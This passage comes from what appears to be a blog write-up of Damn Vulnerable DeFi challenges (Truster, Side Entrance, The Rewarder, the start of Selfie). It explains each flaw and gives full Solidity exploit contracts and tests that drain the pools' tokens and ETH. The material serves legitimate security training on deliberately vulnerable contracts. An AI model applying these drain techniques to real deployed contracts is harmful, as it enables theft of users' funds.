&lt;p&gt;After the function call finishes, the pool checks whether its balance (&lt;code&gt;token.balanceOf(address(this))&lt;/code&gt;) is less than it was before the loan (&lt;code&gt;balanceBefore&lt;/code&gt;). If it is, a &lt;code&gt;revert&lt;/code&gt; occurs. In other words, either the loan amount must be &lt;code&gt;0&lt;/code&gt;, or the borrowed funds must be repaid within the function passed through the &lt;code&gt;data&lt;/code&gt; argument.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;// TrusterLenderPool.flashLoan
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    target.functionCall(data);

    if (token.balanceOf(address(this)) &amp;lt; balanceBefore) {
        revert RepayFailed();
    }

    return true;
}&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Challenge-Solving-2&#34;&gt;&lt;a href=&#34;#Challenge-Solving-2&#34; class=&#34;headerlink&#34; title=&#34;Challenge Solving&#34;&gt;&lt;/a&gt;Challenge Solving&lt;/h3&gt;&lt;p&gt;The key issue here is that the &lt;code&gt;data&lt;/code&gt; argument allows us to call &lt;strong&gt;any function&lt;/strong&gt;. What happens if we call the &lt;a href=&#34;https://github.com/transmissions11/solmate/blob/34d20fc027fe8d50da71428687024a29dc01748b/src/tokens/ERC20.sol#L68&#34;&gt;ERC20.approve()&lt;/a&gt; function?  &lt;/p&gt;
&lt;p&gt;The &lt;code&gt;approve&lt;/code&gt; function sets an &lt;a href=&#34;https://metaschool.so/articles/what-are-erc20-approve-erc20-allowance-methods&#34;&gt;allowance&lt;/a&gt;, which defines how many tokens a specific account (&lt;code&gt;spender&lt;/code&gt;) is allowed to withdraw from the caller&amp;#x2019;s (&lt;code&gt;msg.sender&lt;/code&gt;) account. Importantly, this operation &lt;strong&gt;does not affect the actual balance of the pool&lt;/strong&gt;.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;// ERC20.approve
function approve(address spender, uint256 amount) public virtual returns (bool) {
    allowance[msg.sender][spender] = amount;

    emit Approval(msg.sender, spender, amount);

    return true;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Since increasing the &lt;code&gt;allowance&lt;/code&gt; value only expands the withdrawal limit without affecting the actual balance of the &lt;code&gt;pool&lt;/code&gt;, the following approach can be taken:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Call the &lt;code&gt;flashLoan()&lt;/code&gt; function with the loan amount (&lt;code&gt;amount&lt;/code&gt;) set to 0.  &lt;/li&gt;
&lt;li&gt;Use the &lt;code&gt;data&lt;/code&gt; argument to invoke the &lt;code&gt;ERC20.approve()&lt;/code&gt; function.  &lt;/li&gt;
&lt;li&gt;Pass the &lt;code&gt;if (token.balanceOf(address(this)) &amp;lt; balanceBefore)&lt;/code&gt; check, allowing the &lt;code&gt;flashLoan()&lt;/code&gt; function to complete successfully.  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As a result, the &lt;code&gt;allowance&lt;/code&gt; value will be set high enough for the attacker to drain all of the &lt;code&gt;pool&lt;/code&gt;&amp;#x2019;s assets.  &lt;/p&gt;
&lt;p&gt;The full execution flow looks like this:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Call the &lt;code&gt;flashLoan()&lt;/code&gt; function, setting the loan amount (&lt;code&gt;amount&lt;/code&gt;) to 0.  &lt;/li&gt;
&lt;li&gt;Pass the &lt;code&gt;ERC20.approve()&lt;/code&gt; call through the &lt;code&gt;data&lt;/code&gt; argument, granting the attacker contract permission to withdraw all the &lt;code&gt;pool&lt;/code&gt;&amp;#x2019;s assets by adjusting the &lt;code&gt;allowance&lt;/code&gt;.  &lt;/li&gt;
&lt;li&gt;Since the pool&amp;#x2019;s balance does not change, the &lt;code&gt;flashLoan()&lt;/code&gt; function finishes without any issues.  &lt;/li&gt;
&lt;li&gt;Using the permission obtained via &lt;code&gt;approve&lt;/code&gt;, the attacker then calls &lt;code&gt;transferFrom&lt;/code&gt; to drain all the funds from the &lt;code&gt;pool&lt;/code&gt;.  &lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function test_truster() public checkSolvedByPlayer {
    new TrusterSolver(pool, recovery, token);
}

// ....

contract TrusterSolver {
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;
    constructor(TrusterLenderPool pool, address recovery, DamnValuableToken token) {
        // ERC20.approve(address(this), TOKENS_IN_POOL);
        // address(this) &amp;lt;- TrusterSolver contract
        bytes memory approve_call = abi.encodeCall(ERC20.approve, (address(this), TOKENS_IN_POOL));

        // amount = 0
        // borrower = address(this) = TrusterSolver contract
        // target = token
        // target.functionCall = token.functionCall(approve_call);
        pool.flashLoan(0, address(this), address(token), approve_call);

        // pool -&amp;gt; recovery to TOKENS_IN_POOL DVT
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;4-Side-Entrance-re-enter-the-contract&#34;&gt;&lt;a href=&#34;#4-Side-Entrance-re-enter-the-contract&#34; class=&#34;headerlink&#34; title=&#34;4. Side Entrance: re-enter the contract&#34;&gt;&lt;/a&gt;4. Side Entrance: re-enter the contract&lt;/h2&gt;&lt;h3 id=&#34;Challenge-Explanation-3&#34;&gt;&lt;a href=&#34;#Challenge-Explanation-3&#34; class=&#34;headerlink&#34; title=&#34;Challenge Explanation&#34;&gt;&lt;/a&gt;Challenge Explanation&lt;/h3&gt;&lt;p&gt;The &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/side-entrance/SideEntranceLenderPool.sol#L35&#34;&gt;SideEntranceLenderPool.flashLoan()&lt;/a&gt; function allows the caller (&lt;code&gt;msg.sender&lt;/code&gt;) to borrow any amount of ETH without collateral. After granting the loan, it calls the &lt;code&gt;execute&lt;/code&gt; function defined in the &lt;code&gt;msg.sender&lt;/code&gt; contract, passing the borrowed amount (&lt;code&gt;amount&lt;/code&gt;) as &lt;code&gt;msg.value&lt;/code&gt;.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    if (address(this).balance &amp;lt; balanceBefore) {
        revert RepayFailed();
    }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;execute&lt;/code&gt; function is marked as &lt;a href=&#34;https://docs.soliditylang.org/en/latest/contracts.html#receive-ether-function&#34;&gt;payable&lt;/a&gt;, which means it can receive ETH when invoked. Through the &lt;code&gt;{value: amount}&lt;/code&gt; syntax, the caller sends exactly &lt;code&gt;amount&lt;/code&gt; of ETH to the callee when the function is executed.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;interface IFlashLoanEtherReceiver {
    function execute() external payable;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;SideEntranceLenderPool&lt;/code&gt; contract also provides deposit (&lt;code&gt;deposit&lt;/code&gt;) and withdrawal (&lt;code&gt;withdraw&lt;/code&gt;) functions, recording each user&amp;#x2019;s deposits in the &lt;code&gt;balances&lt;/code&gt; mapping.  &lt;/p&gt;
&lt;p&gt;For example, when the &lt;code&gt;withdraw()&lt;/code&gt; function is called, it sends the caller (&lt;code&gt;msg.sender&lt;/code&gt;) the amount stored in &lt;code&gt;balances&lt;/code&gt; using the &lt;a href=&#34;https://github.com/transmissions11/solmate/blob/50e15bb566f98b7174da9b0066126a4c3e75e0fd/src/utils/SafeTransferLib.sol#L15&#34;&gt;SafeTransferLib.safeTransferETH()&lt;/a&gt; function.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;contract SideEntranceLenderPool {
    mapping(address =&amp;gt; uint256) public balances;
    // ....
    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Challenge-Solving-3&#34;&gt;&lt;a href=&#34;#Challenge-Solving-3&#34; class=&#34;headerlink&#34; title=&#34;Challenge Solving&#34;&gt;&lt;/a&gt;Challenge Solving&lt;/h3&gt;&lt;p&gt;The biggest issue with this contract is that it is vulnerable to a &lt;a href=&#34;https://github.com/kadenzipfel/smart-contract-vulnerabilities/blob/master/vulnerabilities/reentrancy.md&#34;&gt;&lt;strong&gt;Re-entrancy&lt;/strong&gt;&lt;/a&gt; attack. Unlike contracts protected with mechanisms such as &lt;a href=&#34;https://medium.com/@mayankchhipa007/openzeppelin-reentrancy-guard-a-quickstart-guide-7f5e41ee388f&#34;&gt;ReentrancyGuard&lt;/a&gt;, this one has no such safeguards.  &lt;/p&gt;
&lt;p&gt;As shown in the diagram, when contract A calls a function (&lt;code&gt;flashLoan&lt;/code&gt;) of contract B, before the function completes, contract B can call back into contract A&amp;#x2019;s function (&lt;code&gt;execute&lt;/code&gt;), and within that function, A can once again call other functions or access objects in contract B to manipulate its state.  &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/09/07/d4tura/smartcontracts/en/image5.png&#34; alt&gt;  &lt;/p&gt;
&lt;p&gt;Personally, I found this type of re-entrancy vulnerability to be very similar to side-effect vulnerabilities in browser JS engines.  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Examples of JS engine side-effect vulnerabilities:  &lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/saelo/cve-2018-4233/blob/master/pwn.js#L27-L32&#34;&gt;https://github.com/saelo/cve-2018-4233/blob/master/pwn.js#L27-L32&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.enki.co.kr/en/media-center/tech-blog/clobber-the-world-endless-side-effect-issue-in-safari&#34;&gt;https://www.enki.co.kr/en/media-center/tech-blog/clobber-the-world-endless-side-effect-issue-in-safari&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.blog/security/vulnerability-research/getting-rce-in-chrome-with-incorrect-side-effect-in-the-jit-compiler/#exploiting-the-bug&#34;&gt;https://github.blog/security/vulnerability-research/getting-rce-in-chrome-with-incorrect-side-effect-in-the-jit-compiler/#exploiting-the-bug&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Just as side-effect bugs are a classic category of browser JS engine vulnerabilities, re-entrancy is one of the most representative vulnerability classes in smart contracts. It&amp;#x2019;s critical to fully understand it.  &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/09/07/d4tura/smartcontracts/en/image6.png&#34; alt&gt;  &lt;/p&gt;
&lt;p&gt;The attack scenario is as follows:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;From the attacker contract, call the pool&amp;#x2019;s &lt;code&gt;flashLoan()&lt;/code&gt; function to borrow all ETH (&lt;code&gt;ETHER_IN_POOL&lt;/code&gt;).  &lt;/li&gt;
&lt;li&gt;The pool transfers the loan and invokes the attacker contract&amp;#x2019;s &lt;code&gt;execute()&lt;/code&gt; function.  &lt;/li&gt;
&lt;li&gt;Inside &lt;code&gt;execute()&lt;/code&gt;, deposit all borrowed ETH back into the pool using its &lt;code&gt;deposit()&lt;/code&gt; function. This results in the borrowed amount being recorded under &lt;code&gt;balances[attacker contract address]&lt;/code&gt;.  &lt;/li&gt;
&lt;li&gt;Once &lt;code&gt;execute()&lt;/code&gt; finishes, control returns to the &lt;code&gt;flashLoan()&lt;/code&gt; function. Since the pool&amp;#x2019;s balance is unchanged from before the loan, the &lt;code&gt;RepayFailed()&lt;/code&gt; check is not triggered, and the function completes successfully.  &lt;/li&gt;
&lt;li&gt;Finally, from the attacker contract, call the pool&amp;#x2019;s &lt;code&gt;withdraw()&lt;/code&gt; function to withdraw the amount recorded in &lt;code&gt;balances&lt;/code&gt;. This allows the attacker to legally drain the funds and transfer them to &lt;code&gt;recovery&lt;/code&gt;.  &lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function test_sideEntrance() public checkSolvedByPlayer {
    SideEntranceSolver solver = new SideEntranceSolver(pool, recovery);
    solver.solve();
}

// ....

contract SideEntranceSolver is IFlashLoanEtherReceiver {
    uint256 constant ETHER_IN_POOL = 1000e18;

    SideEntranceLenderPool _pool;
    address _recovery;

    constructor(SideEntranceLenderPool pool, address recovery) {
        _pool = pool;
        _recovery = recovery;
    }

    function solve() public {
        _pool.flashLoan(ETHER_IN_POOL);
        _pool.withdraw();
        payable(_recovery).transfer(ETHER_IN_POOL);
    }

    function execute() external payable override {
		    // send ETHER_IN_POOL to _pool
        _pool.deposit{value: ETHER_IN_POOL}();
    }
    
    // receive() required if payable function exists on contract
    receive() external payable {}
}&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;5-The-Rewarder-claim-your-reward-s&#34;&gt;&lt;a href=&#34;#5-The-Rewarder-claim-your-reward-s&#34; class=&#34;headerlink&#34; title=&#34;5. The Rewarder: claim your reward(s)&#34;&gt;&lt;/a&gt;5. The Rewarder: claim your reward(s)&lt;/h2&gt;&lt;h3 id=&#34;Challenge-Explanation-4&#34;&gt;&lt;a href=&#34;#Challenge-Explanation-4&#34; class=&#34;headerlink&#34; title=&#34;Challenge Explanation&#34;&gt;&lt;/a&gt;Challenge Explanation&lt;/h3&gt;&lt;p&gt;This time, instead of offering a flash loan service, the contract provides rewards in the form of &lt;code&gt;DamnValuableToken&lt;/code&gt; and &lt;code&gt;WETH&lt;/code&gt; to a specific list of addresses.  &lt;/p&gt;
&lt;p&gt;The eligible addresses and the corresponding reward amounts are defined as follows:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Distribution of &lt;code&gt;DamnValuableToken&lt;/code&gt; rewards is specified in &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/the-rewarder/dvt-distribution.json&#34;&gt;dvt-distribution.json&lt;/a&gt;.  &lt;/li&gt;
&lt;li&gt;Distribution of &lt;code&gt;WETH&lt;/code&gt; rewards is specified in &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/the-rewarder/weth-distribution.json&#34;&gt;weth-distribution.json&lt;/a&gt;.  &lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;hljs json&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// dvt-distribution.json&lt;/span&gt;
[
    {
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;address&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;0x230abc2a7763e0169b38fbc7d48a5aa7b6245011&amp;quot;&lt;/span&gt;,
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;4665241241345036&lt;/span&gt;
    },
    {
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;address&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;0x81e46e5cbe296dfc5e9b2df97ec8f24a9a65bec2&amp;quot;&lt;/span&gt;,
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;9214418266997362&lt;/span&gt;
    },
    {
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;address&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;0x328809Bc894f92807417D2dAD6b7C998c1aFdac6&amp;quot;&lt;/span&gt;,
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;2502024387994809&lt;/span&gt;
    },
    ...

&lt;span class=&#34;hljs-comment&#34;&gt;// weth-distribution.json&lt;/span&gt;
[
    {
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;address&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;0x230abc2a7763e0169b38fbc7d48a5aa7b6245011&amp;quot;&lt;/span&gt;,
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;3726409081682308&lt;/span&gt;
    },
    {
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;address&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;0x81e46e5cbe296dfc5e9b2df97ec8f24a9a65bec2&amp;quot;&lt;/span&gt;,
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;870420547863448&lt;/span&gt;
    },
    {
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;address&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;0x328809Bc894f92807417D2dAD6b7C998c1aFdac6&amp;quot;&lt;/span&gt;,
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;228382988128225&lt;/span&gt;
    },
    ...&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Looking at the &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/the-rewarder/TheRewarderDistributor.sol#L81&#34;&gt;TheRewardDistributor.claimRewards()&lt;/a&gt; function, you can see that it is implemented to handle multiple reward claims in a single batch. This kind of design&amp;#x2014;accepting multiple requests and processing them within a single transaction&amp;#x2014;is widely adopted in many smart contract implementations to &lt;strong&gt;save on gas fees&lt;/strong&gt;.  &lt;/p&gt;
&lt;p&gt;By the way, there&amp;#x2019;s a vulnerability hidden in this function. Can you spot it? &amp;#x1F60A;  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;struct Distribution {
    uint256 remaining;
    uint256 nextBatchNumber;
    mapping(uint256 batchNumber =&amp;gt; bytes32 root) roots;
    mapping(address claimer =&amp;gt; mapping(uint256 word =&amp;gt; uint256 bits)) claims;
}

// ....

// Allow claiming rewards of multiple tokens in a single transaction
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    Claim memory inputClaim;
    IERC20 token;
    uint256 bitsSet; // accumulator
    uint256 amount;

    for (uint256 i = 0; i &amp;lt; inputClaims.length; i++) {
        inputClaim = inputClaims[i];

        uint256 wordPosition = inputClaim.batchNumber / 256;
        uint256 bitPosition = inputClaim.batchNumber % 256;

        if (token != inputTokens[inputClaim.tokenIndex]) {
            if (address(token) != address(0)) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }

            token = inputTokens[inputClaim.tokenIndex];
            bitsSet = 1 &amp;lt;&amp;lt; bitPosition; // set bit at given position
            amount = inputClaim.amount;
        } else {
            bitsSet = bitsSet | 1 &amp;lt;&amp;lt; bitPosition;
            amount += inputClaim.amount;
        }

        // for the last claim
        if (i == inputClaims.length - 1) {
            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
        }

        bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
        bytes32 root = distributions[token].roots[inputClaim.batchNumber];

        if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();

        inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
    }
}

function _setClaimed(IERC20 token, uint256 amount, uint256 wordPosition, uint256 newBits) private returns (bool) {
    uint256 currentWord = distributions[token].claims[msg.sender][wordPosition];
    if ((currentWord &amp;amp; newBits) != 0) return false;

    // update state
    distributions[token].claims[msg.sender][wordPosition] = currentWord | newBits;
    distributions[token].remaining -= amount;

    return true;
}&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Challenge-Solving-4&#34;&gt;&lt;a href=&#34;#Challenge-Solving-4&#34; class=&#34;headerlink&#34; title=&#34;Challenge Solving&#34;&gt;&lt;/a&gt;Challenge Solving&lt;/h3&gt;&lt;p&gt;The &lt;code&gt;_setClaimed()&lt;/code&gt; function records whether a reward has already been claimed using a bitmap. However, if you look closely at the logic inside &lt;code&gt;claimRewards()&lt;/code&gt;, you&amp;#x2019;ll see that the values for &lt;code&gt;bitsSet&lt;/code&gt; (claim record) and &lt;code&gt;amount&lt;/code&gt; (claim amount) are continuously accumulated.  &lt;/p&gt;
&lt;p&gt;The important detail is that &lt;code&gt;_setClaimed()&lt;/code&gt; is only called &lt;strong&gt;at the end of the loop&lt;/strong&gt; or &lt;strong&gt;when the type of token being processed changes&lt;/strong&gt;, at which point the accumulated claim record is finally stored.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;        bitsSet = bitsSet | 1 &amp;lt;&amp;lt; bitPosition;
        amount += inputClaim.amount;

// ....

        // for the last claim
        if (i == inputClaims.length - 1) {
            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
        }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The problem is that &lt;strong&gt;even if the same reward claim request is submitted multiple times&lt;/strong&gt;, the process of accumulating &lt;code&gt;bitsSet&lt;/code&gt; (&lt;code&gt;bitsSet | 1 &amp;lt;&amp;lt; bitPosition&lt;/code&gt;) does not properly check for duplicates. For example, if the same request is sent five times, the same bit in &lt;code&gt;bitsSet&lt;/code&gt; is simply overwritten five times, and no error occurs.  &lt;/p&gt;
&lt;p&gt;However, since the &lt;code&gt;transfer&lt;/code&gt; operation is executed inside the loop on every iteration, the attacker ends up receiving the reward five times.  &lt;/p&gt;
&lt;p&gt;Because the &lt;code&gt;player&lt;/code&gt; address is already registered in the reward list for each token, this flaw can be exploited by repeatedly claiming the reward assigned to them, thereby solving the challenge.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function test_theRewarder() public checkSolvedByPlayer {

    // Step 1: search player&amp;apos;s index in DVT list
    Reward[] memory dvtRewards = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), &amp;quot;/test/the-rewarder/dvt-distribution.json&amp;quot;))), (Reward[]));
    uint256 dvtIndex;
    uint256 dvtAmount;
    for (uint256 i = 0; i &amp;lt; dvtRewards.length; i++) {
        if (dvtRewards[i].beneficiary == player) {
            dvtIndex = i;
            console.log(&amp;quot;player = &amp;quot;, dvtRewards[i].beneficiary);
            dvtAmount = dvtRewards[i].amount;
            break;
        }
    }
    require(dvtAmount &amp;gt; 0, &amp;quot;Player not in DVT list&amp;quot;);

    // Step 2: search player&amp;apos;s index in WETH list
    Reward[] memory wethRewards = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), &amp;quot;/test/the-rewarder/weth-distribution.json&amp;quot;))), (Reward[]));
    uint256 wethIndex;
    uint256 wethAmount;
    for (uint256 i = 0; i &amp;lt; wethRewards.length; i++) {
        if (wethRewards[i].beneficiary == player) {
            wethIndex = i;
            console.log(&amp;quot;player = &amp;quot;, wethRewards[i].beneficiary);
            wethAmount = wethRewards[i].amount;
            break;
        }
    }
    require(wethAmount &amp;gt; 0, &amp;quot;Player not in WETH list&amp;quot;);

    // Step 3: create proof for each token
    bytes32[] memory dvtLeaves = _loadRewards(&amp;quot;/test/the-rewarder/dvt-distribution.json&amp;quot;);
    bytes32[] memory wethLeaves = _loadRewards(&amp;quot;/test/the-rewarder/weth-distribution.json&amp;quot;);

    bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, dvtIndex);
    bytes32[] memory wethProof = merkle.getProof(wethLeaves, wethIndex);

    // Step 4: create tokensToClaim
    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    // Step 5: calculate how many duplicated claims requires
    uint256 dvtRemaining = distributor.getRemaining(address(dvt));
    uint256 wethRemaining = distributor.getRemaining(address(weth));
    uint256 dvtN = dvtRemaining / dvtAmount; 
    uint256 wethN = wethRemaining / wethAmount;

    // Step 6: create array for duplicated claim
    Claim[] memory claims = new Claim[](dvtN + wethN);
    for (uint256 i = 0; i &amp;lt; dvtN; i++) {
        claims[i] = Claim({
            batchNumber: 0,
            amount: dvtAmount,
            tokenIndex: 0,
            proof: dvtProof
        });
    }
    for (uint256 i = 0; i &amp;lt; wethN; i++) {
        claims[dvtN + i] = Claim({
            batchNumber: 0,
            amount: wethAmount,
            tokenIndex: 1,
            proof: wethProof
        });
    }

    // Step 7: trigger the vulnerability
    distributor.claimRewards(claims, tokensToClaim);

    // Step 8: transfer every tokens to recovery
    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;6-Selfie-believe-or-not-I-am-your-governor&#34;&gt;&lt;a href=&#34;#6-Selfie-believe-or-not-I-am-your-governor&#34; class=&#34;headerlink&#34; title=&#34;6. Selfie: believe or not, I am your governor!&#34;&gt;&lt;/a&gt;6. Selfie: believe or not, I am your governor!&lt;/h2&gt;&lt;h3 id=&#34;Challenge-Explanation-5&#34;&gt;&lt;a href=&#34;#Challenge-Explanation-5&#34; class=&#34;headerlink&#34; title=&#34;Challenge Explanation&#34;&gt;&lt;/a&gt;Challenge Explanation&lt;/h3&gt;&lt;p&gt;We&amp;#x2019;re back again with a flash loan challenge!  &lt;/p&gt;
&lt;p&gt;The &lt;code&gt;SelfiePool.flashLoan()&lt;/code&gt; function works as follows:  &lt;/p&gt;
&lt;p&gt;&amp;#x2192; Lends &lt;code&gt;_amount&lt;/code&gt;&lt;br&gt;&amp;#x2192; Calls the &lt;code&gt;onFlashLoan()&lt;/code&gt; function defined in the &lt;code&gt;_receiver&lt;/code&gt; contract&lt;br&gt;&amp;#x2192; Expects the loaned &lt;code&gt;_amount&lt;/code&gt; to be repaid in full  &lt;/p&gt;
&lt;p&gt;At first glance, it looks fairly straightforward. However, what really stands out here is the presence of a contract called &lt;code&gt;SimpleGovernance&lt;/code&gt;.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;contract SelfiePool is IERC3156FlashLender, ReentrancyGuard {
	  // ....
    
    modifier onlyGovernance() {
        if (msg.sender != address(governance)) {
            revert CallerNotGovernance();
        }
        _;
    }

    constructor(IERC20 _token, SimpleGovernance _governance) {
        token = _token;
        governance = _governance;
    }
    
	  // ....
    
    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
        external
        nonReentrant
        returns (bool)
    {
        if (_token != address(token)) {
            revert UnsupportedCurrency();
        }

        token.transfer(address(_receiver), _amount);
        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        if (!token.transferFrom(address(_receiver), address(this), _amount)) {
            revert RepayFailed();
        }

        return true;
    }

    function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit EmergencyExit(receiver, amount);
    }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&#34;https://medium.com/@dkopolovets/smart-contract-governance-56852c90d3c2&#34;&gt;Governance&lt;/a&gt; refers to a decision-making body composed of users of a smart contract, typically called a &lt;strong&gt;DAO&lt;/strong&gt; (&lt;strong&gt;D&lt;/strong&gt;ecentralized &lt;strong&gt;A&lt;/strong&gt;utonomous &lt;strong&gt;O&lt;/strong&gt;rganization).  &lt;/p&gt;
&lt;p&gt;DAOs that utilize a given smart contract generally hold voting rights and conduct votes. The DAO members with the majority of voting power gain access to certain administrator-level functions or variables within the smart contract.  &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/09/07/d4tura/smartcontracts/en/image7.png&#34; alt&gt;  &lt;/p&gt;
&lt;p&gt;In most cases, these voting rights are determined by the number of governance tokens issued by the smart contract that a member holds.  &lt;/p&gt;
&lt;p&gt;In the case of this challenge&amp;#x2019;s &lt;code&gt;SimpleGovernance&lt;/code&gt; contract, the function &lt;code&gt;_hasEnoughVotes()&lt;/code&gt; ensures that only those who hold more than half of the total voting tokens (&lt;code&gt;_votingToken&lt;/code&gt;) can call &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/selfie/SimpleGovernance.sol#L23&#34;&gt;SimpleGovernance.queueAction()&lt;/a&gt;.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;contract SimpleGovernance is ISimpleGovernance {
		// ....
		
    constructor(DamnValuableVotes votingToken) {
        _votingToken = votingToken;
        _actionCounter = 1;
    }
    
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
        if (!_hasEnoughVotes(msg.sender)) {
            revert NotEnoughVotes(msg.sender);
        }
    
    // ....
   
     function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _votingToken.getVotes(who);
        uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
        return balance &amp;gt; halfTotalSupply;
    }
}&lt;/code&gt;&lt;/pre&gt;
